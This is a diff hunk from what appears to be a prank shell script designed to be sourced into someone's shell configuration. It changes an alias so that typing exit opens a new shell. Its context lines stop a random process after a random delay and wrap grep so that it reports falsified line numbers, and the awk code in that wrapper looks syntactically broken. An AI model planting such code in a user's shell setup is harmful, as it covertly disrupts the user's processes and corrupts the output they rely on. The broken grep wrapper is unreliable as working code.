@@ -74,7 +74,7 @@ sleep $((RANDOM%100 + 1)) && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
 #alias cp='mv';
 
 # Make `exit` open a new shell.
-alias exit='sh';
+alias exit="${SHELL:-sh}";
 
 # Add a random number to line numbers when using `grep -n`.
 grep() { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }
